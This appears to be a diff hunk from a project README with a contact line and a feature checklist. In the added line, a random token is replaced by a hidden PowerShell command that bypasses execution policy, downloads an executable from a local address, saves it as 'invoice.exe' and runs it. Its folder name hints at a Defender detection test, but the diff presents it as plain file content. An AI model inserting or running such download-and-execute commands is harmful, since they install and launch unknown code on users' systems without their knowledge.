@@ -116,4 +116,4 @@ Göktuğ Tunç – gktgtunc@gmail.com
 ✅ Ready-to-use MVP with intuitive UX
 
 
-tjRpii5pwBFbpXNb42JS-Cigy2BerqQZk72n9g8C9UEcHqmNDuG03xpXnhmH0tFPknHzm3mzH6mkr_isJOsiCg-wiyiDgAA
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
